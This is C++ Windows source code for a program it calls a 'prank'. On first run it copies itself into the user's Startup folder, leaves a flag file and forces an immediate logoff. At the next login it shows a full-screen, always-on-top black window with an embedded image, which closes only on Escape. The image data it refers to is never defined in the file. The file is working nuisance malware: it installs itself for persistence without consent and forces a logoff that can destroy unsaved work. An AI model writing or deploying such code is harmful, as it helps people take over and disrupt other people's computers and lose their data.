#include <windows.h>
#include <gdiplus.h>
#include <shlobj.h>
#pragma comment(lib, "gdiplus.lib")
using namespace Gdiplus;

ULONG_PTR gdiplusToken;
Image* pImage = NULL;

Image* LoadImageFromMemory(const unsigned char* data, unsigned int size) {
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
    void* pMem = GlobalLock(hMem);
    memcpy(pMem, data, size);
    GlobalUnlock(hMem);
    IStream* pStream = NULL;
    CreateStreamOnHGlobal(hMem, TRUE, &pStream);
    Image* img = new Image(pStream);
    pStream->Release();
    return img;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            GdiplusStartupInput gdiplusStartupInput;
            GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
            pImage = LoadImageFromMemory(image_data, image_size);
            break;
        }
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rect;
            GetClientRect(hwnd, &rect);
            FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
            if (pImage) {
                Graphics graphics(hdc);
                int imgW = pImage->GetWidth();
                int imgH = pImage->GetHeight();
                int x = (rect.right - imgW) / 2;
                int y = (rect.bottom - imgH) / 2;
                graphics.DrawImage(pImage, x, y, imgW, imgH);
            }
            EndPaint(hwnd, &ps);
            break;
        }
        case WM_KEYDOWN:
            if (wParam == VK_ESCAPE) PostQuitMessage(0);
            break;
        case WM_DESTROY:
            delete pImage;
            GdiplusShutdown(gdiplusToken);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    char flagPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, flagPath);
    strcat_s(flagPath, "\\prank.flag");

    char startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    strcat_s(startupPath, "\\prank.exe");

    HANDLE hFile = CreateFile(flagPath, GENERIC_READ, 0, NULL,
                              OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CopyFileA(exePath, startupPath, FALSE);
        HANDLE hNew = CreateFile(flagPath, GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, 0, NULL);
        CloseHandle(hNew);
        ExitWindowsEx(EWX_LOGOFF | EWX_FORCE,
            SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
        return 0;
    }
    CloseHandle(hFile);
    DeleteFile(flagPath);
    DeleteFileA(startupPath);

    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "BlackScreen";
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClass(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST, "BlackScreen", "",
        WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh,
        NULL, NULL, hInstance, NULL
    );
    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}


// BY RIR OR MELON 
